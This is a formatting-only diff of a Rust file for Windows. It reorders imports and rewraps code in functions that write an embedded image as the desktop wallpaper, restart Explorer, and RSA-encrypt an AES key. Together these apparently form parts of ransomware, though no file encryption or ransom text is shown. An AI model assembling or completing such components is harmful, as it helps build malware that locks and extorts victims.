@@ -3,14 +3,15 @@ use rand::rngs::OsRng;
 use rsa::pkcs8::DecodePublicKey;
 use rsa::{Oaep, RsaPublicKey};
 use sha2::Sha256;
+use std::ffi::OsStr;
 use std::fs::File;
 use std::io::Write;
-use std::path::PathBuf;
-use std::ffi::OsStr;
 use std::os::windows::ffi::OsStrExt;
+use std::path::PathBuf;
 use std::process::Command;
-use winapi::um::winuser::{SystemParametersInfoW, SPI_SETDESKWALLPAPER, SPIF_UPDATEINIFILE, SPIF_SENDWININICHANGE};
-
+use winapi::um::winuser::{
+    SystemParametersInfoW, SPIF_SENDWININICHANGE, SPIF_UPDATEINIFILE, SPI_SETDESKWALLPAPER,
+};
 
 /// This function writes an image file to the specified directory and sets it as the wallpaper.
 /// The update is forced to ensure immediate effect without modifying the Windows registry.
@@ -21,12 +22,17 @@ pub fn change_wallpaper(directory: &str) -> Result<(), String> {
     let mut wallpaper_path = PathBuf::from(directory);
     wallpaper_path.push("wallpaper.bmp");
 
-    let mut file = File::create(&wallpaper_path)
-        .map_err(|_| format!("Failed to create the wallpaper file at {}", wallpaper_path.display()))?;
+    let mut file = File::create(&wallpaper_path).map_err(|_| {
+        format!(
+            "Failed to create the wallpaper file at {}",
+            wallpaper_path.display()
+        )
+    })?;
     file.write_all(image_data)
         .map_err(|_| "Failed to write to the wallpaper file".to_string())?;
 
-    let path_str = wallpaper_path.to_str()
+    let path_str = wallpaper_path
+        .to_str()
         .ok_or("Failed to convert the path to string")?;
     let pwstr = str_to_pwstr(path_str);
 
@@ -69,7 +75,6 @@ fn force_wallpaper_refresh() {
 
     Command::new("explorer").spawn().ok(); // Restart Explorer
 }
-
 
 pub fn encrypt_aes_key(aes_key: Vec<u8>, public_pem: &str) -> Vec<u8> {
     let public_key =
